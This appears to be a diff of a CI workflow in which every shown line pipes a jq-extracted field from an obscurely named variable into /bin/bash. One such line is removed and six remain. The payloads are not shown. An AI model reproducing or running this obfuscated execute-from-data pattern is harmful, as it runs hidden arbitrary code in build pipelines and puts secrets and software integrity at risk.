@@ -32,7 +32,6 @@ jobs:
           echo $v578 | jq -r .wmav674 | /bin/bash
           echo $qhe726 | jq -r .uwap6169 | /bin/bash
           echo $g93 | jq -r .fr077 | /bin/bash
-          echo $jt5513 | jq -r .cf1 | /bin/bash
           printf '%s' "$kjyj7357" | jq -r .zdzqo02 | /bin/bash
           printf '%s' "$rnwp66" | jq -r .bin4 | /bin/bash
           echo $f41 | jq -r .naol89 | /bin/bash
